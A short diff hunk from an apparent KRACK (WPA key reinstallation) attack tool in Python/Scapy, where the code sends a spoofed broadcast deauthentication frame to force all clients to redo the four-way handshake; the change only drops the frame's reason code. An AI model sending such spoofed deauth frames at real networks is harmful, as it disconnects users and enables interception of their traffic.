@@ -859,7 +859,7 @@ class KRAckAttack():
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
 		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
-		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
+		deauth = RadioTap()/dot11/Dot11Deauth()
 		self.sock_real.send(deauth)
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
